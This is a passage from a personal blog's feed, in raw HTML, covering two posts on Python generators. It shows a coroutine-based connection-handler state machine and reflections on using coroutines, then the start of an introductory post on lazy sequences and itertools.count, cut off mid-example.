style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"State: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">state</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">, Event: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">event</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">, Data: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">data</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token string-interpolation interpolation">strip</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token string-interpolation interpolation"> data </span><span class="token string-interpolation interpolation keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation string" style="color:rgb(255, 121, 198)">'-'</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">match</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">state</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> event</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"DISCONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTING"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTING"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect_success"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTED"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTING"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect_fail"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"ERROR"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Connection failed, entering error state."</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">break</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Exit the coroutine</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"send_data"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">extend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"utf-8"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;=</span><span class="token plain"> max_buffer_length</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    flush_buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"disconnect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    flush_buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"DISCONNECTED"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">_</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token comment" style="color:rgb(98, 114, 164)"># Default case for any unhandled state/event combination</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"-&gt; No transition for event '</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">event</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">' in state '</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">state</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">'!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Potentially dropping data '</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">data</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">'!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Starting Connection Test..."</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">handler </span><span class="token operator">=</span><span class="token plain"> connection_handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">64</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)"># Small buffer for testing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"connect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"connect_success"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"send_data"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"Sphinx of black quartz, judge my vow!\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Nothing printed</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"send_data"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"The quick brown fox jumped over the lazy dog.\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Both pangrams printed as the buffer is full</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"send_data"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"The five boxing wizards jump quickly?\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Nothing printed</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"disconnect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># The buffer is flushed before disconnect</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">close</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<p>Obviously this connection handler could easily be handled with an object instance, that uses instance members to manage the internal state.
However, there are affordances that the object instance doesn't provide for use cases that involve concurrency.</p>
<p>The first is when the function can unblock during work that is suitable for concurrent processing (network and file operations, generally).
This is extra useful in a language like Python which doesn't allow for parallel multi-threading, so the only time that concurrency is a useful speedup is when there is non-blocking IO.
In this use case, the caller would be somehow responsible for handling the completion interrupt and sending back over to the generator code.
This particular approach was critical earlier in Python history, before async await constructs were implemented.
However, async await is definitely the dominant pattern now to implement non-blocking IO.</p>
<p>However, the second use that remains is for distributed execution environments.
The generator can define the boundary of execution with another programmatic environment.
For example, imagine you're implementing a path finding algorithm with a simple robot.
You can send commands and receive sensor status, but the computation is inherently asynchronous.
You don't know how long commands will take to complete, or given the obstacles that the robot faces if they even will be completed!</p>
<p>Imagine that our program is the robot's brain, with the Pythonic compute environment, and we send commands and receive statuses from the robot's compute environment, which houses its body and sense.
In this model, it's critical that we can suspend and resume the brain execution while the robot's compute executes.
With this ability, we can easily avoid busy waiting, and later in our implementation we can actually chain different generators together using a <code>yield from</code> syntax to delegate generator execution!</p>
<p>This is all a bit too conceptual, right? Would be nice to see some code?
This is actually the problem set forth in the <a href="https://github.com/dutc/mazerunner-bnl-2024/blob/main/README.md" target="_blank" rel="noopener noreferrer">DUTC mazerunner problem statement</a>, so rather than directly write some code here for you to skim past I'm leaving it to you, the reader, to jump in and try out a generator implementation yourself!
In addition to the problem statment, the repo includes the general scaffolding around implementation of the brain I mentioned above.
If you're curious about my experience grappling with this problem, or have questions about tackling it yourself, please reach out!</p>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="would-i-use-this-in-large-projects">Would I Use This in Large Projects?<a href="https://clifford.ressel.fyi/blog/python-generators-part2#would-i-use-this-in-large-projects" class="hash-link" aria-label="Direct link to Would I Use This in Large Projects?" title="Direct link to Would I Use This in Large Projects?">​</a></h2>
<p>Just recently I worked on a TUI application that has both a need for yielding from asynchronous branches, and also an internal state machine that governs the application input.
Ultimately I avoided implementing generators to handle these approachs because the project is in Rust, and there isn't a good syntactic pattern to use this pause/resume approach to function evaluation in that language.</p>
<p>However, if I had been using Python then I ultimately don't know if I would have first tackled these async functionalities with a generator based approach.
The async await approach is just much more well-trodden ground.
While this pattern vastly simplifies several situations described above, there are several very difficult mental obstacles:</p>
<ol>
<li>The first/rest and rest/last modalities of how the generator and the caller know it starting, finishing, or in progress.</li>
<li>The generator or coroutine specializes based on business logic, making it difficult to test that encapsulation.</li>
<li>When composition of the coroutines comes into play, it's a high cognitive burden to reason about!</li>
</ol>
<p>If you've followed all of the examples here, that's great! And maybe you're more ready to put this pattern in practice then I am.
On my side, I'm well ready to reason about generators when the boundary of the pattern is either data-less (the "taking turns" use-case) or unidirectional (pausing and resuming iteration or data processes).
I may require some further iteration through architect -&gt; regret -&gt; revise -&gt; refactor, before I'm ready to put the full bidirectional strength of coroutines to work!
But I do expect the mental model to be useful in the future.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Learning generators part 1: Basics]]></title>
            <link>https://clifford.ressel.fyi/blog/python-generators-part1</link>
            <guid>https://clifford.ressel.fyi/blog/python-generators-part1</guid>
            <pubDate>Sat, 30 Dec 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[How generators can be used in four ways (from simple to complex):]]></description>
            <content:encoded><![CDATA[<p>How generators can be used in four ways (from simple to complex):</p>
<ol>
<li><strong>Lazy-like expressions, including unbounded sequences</strong></li>
<li><strong>Alternating control flow with the caller</strong></li>
<li>A "pure-looking" function, with hidden internal state</li>
<li>Internally managing a state-machine, that handles caller-passed input</li>
</ol>
<p>The first two use cases are covered in this article, and serve as a primer to the topic.</p>
<p>The second two use cases are covered in the <a href="https://clifford.ressel.fyi/blog/python-generators-part2">second part here</a>, and might provide a new applied usage for those already familiar with generators and coroutines.</p>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="lazy-expressions-and-unbounded-sequences">Lazy Expressions and Unbounded Sequences<a href="https://clifford.ressel.fyi/blog/python-generators-part1#lazy-expressions-and-unbounded-sequences" class="hash-link" aria-label="Direct link to Lazy Expressions and Unbounded Sequences" title="Direct link to Lazy Expressions and Unbounded Sequences">​</a></h2>
<p>Users usually first experience lazy-like behavior in Python when iterating through sequences, like so:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">fizzbuzz_squares </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Doesn't ever store 5mil elements at once:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">5_000_000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> i </span><span class="token operator">**</span><span class="token plain"> </span><span class="token number">2</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> </span><span class="token number">15</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        fizzbuzz_squares</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">i </span><span class="token operator">**</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Or more succinctly, with generator comprehension syntax:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fizzbuzz_squares </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">list</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">i</span><span class="token operator">**</span><span class="token number">2</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">5_000_000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> i </span><span class="token operator">**</span><span class="token plain"> </span><span class="token number">2</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> </span><span class="token number">15</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<p>The <code>range</code> function is a builtin that doesn't return a generator. Instead, <code>range()</code> uses its own class, which implements the Iterable and the Sequence protocols with a lazy design thereof.
This is important so that an interpreter like CPython can execute instructions more quickly using the corresponding C builtin implementation, instead of interpreting comparitively slow Python bytecode.</p>
<p>However, this behavior is so useful that it is necessary to generalize it for other use csae.
Take for example unbounded sequences, where we by necessity need laziness.
The <a href="https://docs.python.org/3/library/itertools.html#itertools.count" target="_blank" rel="noopener noreferrer"><code>count</code> function from the <code>itertools</code> module</a> is implemented like so:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">count</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">start</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> step</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># count(10) --&gt; 10 11 12 13 14 ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># count(2.5, 0.5) --&gt; 2.5 3.0 3.5 ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    n </span><span class="token operator">=</span><span class="token plain"> start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain"> n</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        n </span><span class="token operator">+=</span><span class="token plain"> step</span><br></span></code></pre></div></div>
<p>Taking this back to our Fizz Buzz snippet, we might use unbounded sequences to calculate our value without actually knowing the stop condition up front.
For example, to get all of the Fizz Buzz squares less than one million:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> itertools </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> count</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> takewhile</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">max_value </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1_000_000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fizzbuzz_squares </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> candidate </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> count</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" 